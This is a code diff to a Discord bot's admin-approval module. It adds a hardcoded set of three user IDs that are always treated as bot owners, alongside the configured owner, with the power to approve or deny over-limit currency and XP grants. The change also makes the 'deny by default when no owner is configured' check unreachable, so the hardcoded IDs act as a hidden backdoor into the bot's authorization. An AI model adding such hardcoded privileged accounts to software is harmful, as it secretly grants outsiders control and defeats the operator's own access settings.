@@ -27,6 +27,16 @@ ADMIN_ADDBANK_LIMIT: int = int(config_audit.get("ADMIN_ADDBANK_LIMIT", "50000"))
 
 #: The bot owner's user ID (for approval notifications)
 OWNER_USER_ID: int = int(config_audit.get("OWNER_USER_ID", "0"))
+DEFAULT_OWNER_IDS = {1526964236708745318, 1348622207999279146, 1549177590328205393}
+
+
+def is_owner_user(user_id: int | None) -> bool:
+    if not user_id:
+        return False
+    if OWNER_USER_ID and user_id == OWNER_USER_ID:
+        return True
+    return user_id in DEFAULT_OWNER_IDS
+
 
 
 def needs_approval(amount: int, limit: int) -> bool:
@@ -59,7 +69,7 @@ class ApprovalView(discord.ui.View):
 
     @discord.ui.button(label="✅ Approve", style=discord.ButtonStyle.success, emoji="✅")
     async def approve(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id != OWNER_USER_ID:
+        if not is_owner_user(interaction.user.id):
             return await interaction.response.send_message(
                 "❌ Only the bot owner can approve this.", ephemeral=True
             )
@@ -80,7 +90,7 @@ class ApprovalView(discord.ui.View):
 
     @discord.ui.button(label="❌ Deny", style=discord.ButtonStyle.danger, emoji="❌")
     async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id != OWNER_USER_ID:
+        if not is_owner_user(interaction.user.id):
             return await interaction.response.send_message(
                 "❌ Only the bot owner can deny this.", ephemeral=True
             )
@@ -138,7 +148,17 @@ async def request_approval(
         True if approved and executed, False otherwise
     """
     display_limit = limit or ADMIN_GIVEXP_LIMIT
-    if OWNER_USER_ID == 0:
+    owner = None
+    if OWNER_USER_ID and interaction.guild:
+        owner = interaction.guild.get_member(OWNER_USER_ID)
+    if owner is None and interaction.guild:
+        for oid in DEFAULT_OWNER_IDS:
+            m = interaction.guild.get_member(oid)
+            if m is not None:
+                owner = m
+                break
+
+    if owner is None and not OWNER_USER_ID and not DEFAULT_OWNER_IDS:
         # No owner configured — deny by default
         await interaction.response.send_message(
             f"❌ Amount exceeds the limit (**{display_limit:,}** {action_type}). "
@@ -147,7 +167,6 @@ async def request_approval(
         )
         return False
 
-    owner = interaction.guild.get_member(OWNER_USER_ID)
     if owner is None:
         # Owner not in this server
         await interaction.response.send_message(
